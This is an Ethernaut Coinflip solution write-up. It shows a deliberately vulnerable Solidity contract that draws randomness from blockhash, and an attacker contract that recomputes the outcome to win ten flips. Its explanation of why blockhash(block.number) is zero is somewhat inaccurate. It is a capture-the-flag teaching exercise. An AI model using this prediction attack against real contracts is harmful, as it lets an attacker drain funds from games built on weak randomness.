---
description: randomness in blockchain
---

# 3 - Coinflip

Ethernaut Level3: [Coinflip](https://ethernaut.openzeppelin.com/level/0x90501cC20b65f603f847398740eaC4C9BE4873a9)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### Goal of this level

* guess the correct outcome **10 times** in a row

### What you should know before

* Deterministic feature of blockchain\
  \-> see [here](https://youtu.be/8FF3IBTMeK0)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

You can **mimic** the exact calculation of of the random number

</details>

Use Remix IDE!

```solidity
contract AttackCoinFlip {
    CoinFlip public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _instanceAddr) public{
        coinFlipContract = CoinFlip(_instanceAddr);
    }
    
    function makeGuess() public {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}
```

Transaction to call `makeGuess()` and `flip()` will be mined in the same block, so the value of `block.number` will be the same.

You merely have to run `makeGuess()` function `10` times in a row.

Done! 😎

#### Why the code uses block.number - 1

The transaction itself affects the value of `blockhash`,\
so `blockhash(block.number)` is fixed to be `0`.

## Key Takeaways

* There's no such thing as true randomness in blockchain,\
  every thing is **deterministic**!
